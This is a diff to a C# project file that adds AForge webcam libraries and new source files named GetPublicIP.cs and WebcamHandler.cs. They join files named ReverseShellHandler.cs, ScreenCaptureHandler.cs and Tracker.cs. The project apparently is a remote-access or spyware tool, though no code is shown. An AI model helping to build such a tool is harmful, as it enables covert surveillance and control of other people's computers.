@@ -30,6 +30,15 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="AForge">
+      <HintPath>..\packages\AForge.2.2.5\lib\AForge.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video">
+      <HintPath>..\packages\AForge.Video.2.2.5\lib\AForge.Video.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.DirectShow">
+      <HintPath>..\packages\AForge.Video.DirectShow.2.2.5\lib\AForge.Video.DirectShow.dll</HintPath>
+    </Reference>
     <Reference Include="LinqToTwitter.AspNet">
       <HintPath>..\packages\LinqToTwitter.3.1.2\lib\net45\LinqToTwitter.AspNet.dll</HintPath>
     </Reference>
@@ -69,11 +78,13 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Bitmap.cs" />
+    <Compile Include="GetPublicIP.cs" />
     <Compile Include="Messenger.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="ReverseShellHandler.cs" />
     <Compile Include="ScreenCaptureHandler.cs" />
     <Compile Include="Tracker.cs" />
+    <Compile Include="WebcamHandler.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="app.config" />
